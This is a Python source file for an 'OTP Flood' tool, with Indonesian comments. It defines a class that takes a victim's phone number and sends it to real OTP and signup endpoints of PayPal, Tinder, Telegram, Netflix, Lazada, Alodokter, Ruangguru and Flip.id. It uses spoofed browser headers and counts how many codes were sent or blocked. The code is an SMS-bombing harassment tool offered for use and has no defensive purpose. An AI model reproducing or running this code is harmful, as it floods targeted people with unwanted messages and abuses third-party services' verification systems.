"""
OTP Flood - OTP Trigger Mode (Updated with fresh +62 Endpoints)
"""

import requests
import json
import time
import random
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class OTPTrigger:
    """
    Trigger OTP dari brand asli.
    Target nerima OTP beneran, nomor lo aman, gratis total.
    """

    def __init__(self, target_number):
        self.target = self._format(target_number)
        self.sent_count = 0
        self.block_count = 0
        self.error_count = 0
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
        })

    def _format(self, n):
        n = n.strip().replace("+", "").replace(" ", "").replace("-", "")
        if n.startswith("0"):
            n = "62" + n[1:]
        return n

    def _phone(self):
        """Return phone in 08xx format (Indonesia)"""
        if self.target.startswith("62"):
            return "0" + self.target[2:]
        return self.target

    # ============================================================
    # GLOBAL ENDPOINTS (Pasti kirim ke +62)
    # ============================================================

    def trigger_paypal(self):
        """Beast_Bomber Paypal endpoint"""
        url = "https://www.paypal.com/welcome/signup"
        payload = {
            "/appData/action": "init_phone_confirmation",
            "/appData/griffinData": "true",
            "/initiatePhoneConfirmData/phoneCountry": "ID",
            "/paypalAccountData/phoneOption": "Mobile",
            "/paypalAccountData/phoneNumber": self.target[2:], # remove 62
            "/paypalAccountData/phoneCountryCode": "62",
            "/paypalAccountData/createUpdateReady": False,
            "/initiatePhoneConfirmData/sendSms": "yes",
            "/initiatePhoneConfirmData/createUpdateReady": True,
            "/initiatePhoneConfirmData/phoneNumber": self.target[2:],
            "/initiatePhoneConfirmData/phoneCountryCode": "62"
        }
        try:
            r = self.session.post(url, json=payload, timeout=10)
            if r.status_code in (200, 201):
                return "sent"
            return "blocked"
        except: return "error"

    def trigger_tinder(self):
        """Tinder SMS OTP endpoint"""
        url = "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms"
        payload = {"phone_number": f"+{self.target}"}
        try:
            r = self.session.post(url, json=payload, timeout=10)
            if r.status_code == 200:
                return "sent"
            return "blocked"
        except: return "error"

    def trigger_telegram(self):
        """Telegram Web login password request"""
        url = "https://my.telegram.org/auth/send_password"
        data = {"phone": f"+{self.target}"}
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        try:
            r = self.session.post(url, data=data, headers=headers, timeout=10)
            if r.status_code == 200 and "true" in r.text.lower():
                return "sent"
            return "blocked"
        except: return "error"

    def trigger_netflix(self):
        url = "https://www.netflix.com/id/login/sendOtp"
        data = {"phone": self._phone()}
        try:
            r = self.session.post(url, json=data, timeout=10)
            if r.status_code == 200:
                return "sent"
            return "blocked"
        except: return "error"

    # ============================================================
    # INDONESIA ENDPOINTS
    # ============================================================

    def trigger_lazada(self):
        url = "https://member.lazada.co.id/user/api/sendVerificationSms"
        # Need basic headers to mimic browser
        headers = {
            "Origin": "https://member.lazada.co.id",
            "Referer": "https://member.lazada.co.id/user/register",
        }
        payload = {
            "phone": self.target[2:], # remove 62
            "type": "OTP_REGISTER",
            "lzdAppVersion": "1.0"
        }
        try:
            r = self.session.post(url, json=payload, headers=headers, timeout=10)
            if r.status_code == 200:
                return "sent"
            return "blocked"
        except: return "error"

    def trigger_alodokter(self):
        """Alodokter OTP request"""
        url = "https://api.alodokter.com/api/v1/auth/otp"
        payload = {"phone": self._phone()}
        try:
            r = self.session.post(url, json=payload, timeout=10)
            if r.status_code in (200, 201):
                return "sent"
            return "blocked"
        except: return "error"

    def trigger_ruangguru(self):
        """Ruangguru OTP request"""
        url = "https://api.ruangguru.com/v1/user/otp"
        payload = {"phone": self._phone(), "type": "register"}
        try:
            r = self.session.post(url, json=payload, timeout=10)
            if r.status_code == 200:
                return "sent"
            return "blocked"
        except: return "error"

    def trigger_flip(self):
        """Flip.id OTP request"""
        url = "https://api.flip.id/v1/user/otp"
        payload = {"phone": self._phone(), "type": "registration"}
        try:
            r = self.session.post(url, json=payload, timeout=10)
            if r.status_code in (200, 201):
                return "sent"
            return "blocked"
        except: return "error"

    # ============================================================
    # ALL BRANDS MAP
    # ============================================================

    BRANDS = {
        "paypal": {"name": "Paypal", "category": "finance", "fn": trigger_paypal},
        "tinder": {"name": "Tinder", "category": "social-media", "fn": trigger_tinder},
        "telegram": {"name": "Telegram", "category": "social-media", "fn": trigger_telegram},
        "netflix": {"name": "Netflix", "category": "streaming", "fn": trigger_netflix},
        "lazada": {"name": "Lazada", "category": "e-commerce", "fn": trigger_lazada},
        "alodokter": {"name": "Alodokter", "category": "health", "fn": trigger_alodokter},
        "ruangguru": {"name": "Ruangguru", "category": "education", "fn": trigger_ruangguru},
        "flip": {"name": "Flip.id", "category": "finance", "fn": trigger_flip},
    }

    CATEGORIES = {
        "finance": ["paypal", "flip"],
        "social-media": ["tinder", "telegram"],
        "streaming": ["netflix"],
        "e-commerce": ["lazada"],
        "other": ["alodokter", "ruangguru"],
    }

    class _color:
        RST = "\033[0m"
        DIM = "\033[2m"
        YLW = "\033[93m"
        GRN = "\033[92m"
        RED = "\033[91m"
        CYN = "\033[96m"
        MAG = "\033[35m"
        B = "\033[1m"

    def trigger(self, brand_key):
        brand = self.BRANDS.get(brand_key)
        if not brand:
            return "error"
        fn = brand["fn"]
        result = fn(self)
        
        if result == "sent":
            self.sent_count += 1
        elif result == "blocked":
            self.block_count += 1
        else:
            self.error_count += 1
        
        return result

    def get_stats(self):
        return {
            "target": self.target,
            "sent": self.sent_count,
            "blocked": self.block_count,
            "error": self.error_count,
        }
